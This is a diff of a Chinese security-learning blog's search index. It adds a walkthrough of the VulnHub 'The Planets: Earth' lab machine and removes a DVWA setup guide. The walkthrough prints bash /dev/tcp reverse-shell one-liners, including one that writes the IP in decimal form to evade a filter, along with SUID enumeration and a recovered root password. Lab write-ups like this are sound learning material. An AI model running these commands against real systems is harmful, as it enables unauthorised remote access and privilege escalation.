     <url>/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h2 id="好久不写笔记了，随便整个靶机划划水"><a href="#好久不写笔记了，随便整个靶机划划水" class="headerlink" title="好久不写笔记了，随便整个靶机划划水"></a>好久不写笔记了，随便整个靶机划划水</h2><blockquote>
@@ -648,6 +674,50 @@
 <p>运行文件，在Simon后面随便来十五个字符再加上/bin/sh即可提权成功。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>提权成功，拿到最后一个flag。<br>至此，渗透结束。</p>
 <hr>
 <p>本人萌新一枚，不足之处希望师傅们可以指出来让我好好学习一下。<br>最后，感谢你看到这里~o(<em>￣︶￣</em>)o</p>
+]]></content>
+      <categories>
+        <category>靶机渗透记录</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机The Planets: Earth渗透记录</title>
+    <url>/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>前段时间忙于比赛，现在要继续开始学习了，不过又因为期末了所以靶机渗透更新的还是很慢…<br>本人学疏才浅，大佬们轻喷…</p>
+<hr>
+<blockquote>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
+</blockquote>
+<hr>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机The Planets: Earth×1  NAT模式<br>渗透机kali 2021.2×1 和靶机在同一网段<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>用arp-scan扫描ip，然后用mac地址确定目标<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>扫扫扫</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.164</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>根据nmap扫描的结果可以发现我们是需要加host才能打开那两个网址<br>访问靶机ip也就一个服务开启的默认界面<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>加上host之后打开</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>测试界面，啊我不信<br>另外一个地址打开后是类似一个留言功能的业务<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>好像没啥漏洞，不过发送记录会展示在页面，发现了三串数字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line"></span><br><span class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line"></span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>用dirb扫描了一下，发现有个后台<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>不过需要用户名和密码<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>另外一个也用dirb扫了一下，发现robots.txt是有东西的<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>比较可疑的是最后的居然屏蔽的是文件格式，那就试一下吧。<br>发现/testingnotes.txt有提示<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>去访问了一下testdata.txt，发现了几句话。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>根据提示可以看出来，我们需要解密之前留言板上的密文————用testdata.txt异或解密<br>找在线网站解密一下，拿到了密码<code>earthclimatechangebad4humans</code><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>登录之后发现了命令行交互，于是决定打个反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.155.128/2333 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>但是失败了，好像是对ip有限制<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>于是尝试绕过</p>
+<blockquote>
+<p><a href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232275328/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>拿到了第一个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>先去看一下/usr/bin/reset_root<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>执行失败<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>是一个可执行的二进制文件，可以利用nc传输到kali攻击机上。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ltrace -S ./reset_root</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>可以看到程序运行的时候提示缺少了几个文件<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"><br>那咋办呢？那就创建一个吧<br>在靶机上创建好后去运行，拿到了root的密码Earth<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/29.png"><br>于是su切换到root用户输入密码<br>进入/root目录，拿到第二个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/30.png"><br>至此，渗透结束。</p>
+<hr>
+<blockquote>
+<p>暮晓春来迟，先于百花知。岁岁种桃花，开在断肠时。</p>
+</blockquote>
+<hr>
 ]]></content>
       <categories>
         <category>靶机渗透记录</category>
@@ -694,27 +764,6 @@
 ]]></content>
       <tags>
         <tag>靶机渗透记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在win10搭建DVWA</title>
-    <url>/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/</url>
-    <content><![CDATA[<h2 id="搭建DVWA漏洞环境"><a href="#搭建DVWA漏洞环境" class="headerlink" title="搭建DVWA漏洞环境"></a>搭建DVWA漏洞环境</h2><p>下载phpstudy或wamp，我用的是phpstudy2018（此处感谢我的一位同学，很早就给我点到这里了，十分感谢！）<br>打开phpstudy，启动Apache和MySQL<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.1.png"></p>
-<span id="more"></span>  
-<p>然后进入phpadmin<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.2.png"><br>phpmyadmin数据库管理工具的用户名和密码默认都为root<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.3.png"><br>点击数据库，创建名为DVWA的数据库<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.4.png"><br>想查看的话可以通过phpstudy打开数据库存所对应的文件夹<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.5.png"><br>下载dvwa的zip包，解压放置到\phpStudy\PHPTutorial\WWW<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.6.png"><br>然后进入\PHPTutorial\WWW\DVWA-master\config  找到文件config.inc.php.dist<br>复制粘贴一份并将其名称改为config.inc.php【将.dist去掉即可】<br>进去修改配置，修改后如下：<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.65.png"><br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.7.png"><br>保存之后打开浏览器，地址栏输入127.0.0.1/DVWA-master/setup.php<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.8.png"><br>在这里需要看看Setup Check中是否有红色字体的Disabled<br>如果有，需要把问题解决才可以Create/reset database<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.9.png"><br>比如我这里就出问题了。PHP function allow_url_include:disabled<br>解决方法：先进入指定目录<br>选择自己版本的文件夹，我这里是php-5.4.45<br>打开后找到php.int并进行修改<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.0.png"><br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.1.png"><br>修改后如下：<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.2.png"><br>修改后在浏览器打开127.0.0.1/DVWA-master/setup.php<br>问题解决了<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.3.png"><br>点击Create/reset database会自动跳转到DVWA的登录界面<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.4.png"><br>默认用户名：admin  密码：password<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.5.png"><br>登录成功，部署成功！</p>
-<hr>
-<p>我真的适合这条路吗？我不知道<br>一直往前走，就适合了吧<br>2021年3月1日，有件事我可能会记很久，我本来在外面散心情。在外面的时候师傅突然问我要不要学东西，我立马跑回来家打开电脑。事后我觉得很震惊，而且心里酸酸的。时不时有人来问我学习视频看到哪里了，或者打ctf，有人问我博客的事，有人跟我分享学习……他们也给了我动力。<br>接下来，还有很长的路要走<br>加油</p>
-<hr>
-<blockquote>
-<p>我希望我希望的有希望</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>Web安全学习记录</category>
-      </categories>
-      <tags>
-        <tag>Web安全学习记录</tag>
       </tags>
   </entry>
 </search>
